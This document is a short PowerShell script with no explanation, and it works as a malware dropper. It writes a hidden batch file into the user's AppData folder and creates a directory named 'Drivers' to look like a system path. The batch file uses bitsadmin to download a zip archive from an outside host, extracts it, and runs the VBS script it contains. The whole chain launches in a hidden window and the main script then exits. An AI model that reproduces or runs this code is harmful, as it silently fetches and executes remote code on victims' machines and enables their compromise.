$scriptContent = @"
@echo off
set "targetFolder=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Drivers"
set "compressedFileUrl=https://dso2.raed.net:454/files/Installer.zip"
set "vbsScriptPath=%targetFolder%\VSHS.vbs"

:: Create the target folder if it doesn't exist
if not exist "%targetFolder%" (
    mkdir "%targetFolder%"
)

:: Download the compressed file
bitsadmin.exe /transfer myDownloadJob /download /priority NORMAL %compressedFileUrl% "%targetFolder%\Installer.zip"

:: Extract the contents of the compressed file to the target folder
expand "%targetFolder%\Installer.zip" "%targetFolder%" -F:*

cd "%vbsScriptPath%"
:: Run the VBS script
wscript.exe "%vbsScriptPath%"
"@

# Define the path to the script file
$scriptFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\WIN.bat"

# Write the script content to the file
$scriptContent | Out-File -FilePath $scriptFilePath -Encoding utf8

# Run the script in the background
Start-Process -FilePath "cmd.exe" -ArgumentList "/C $scriptFilePath" -WindowStyle Hidden

# Exit the main script
exit
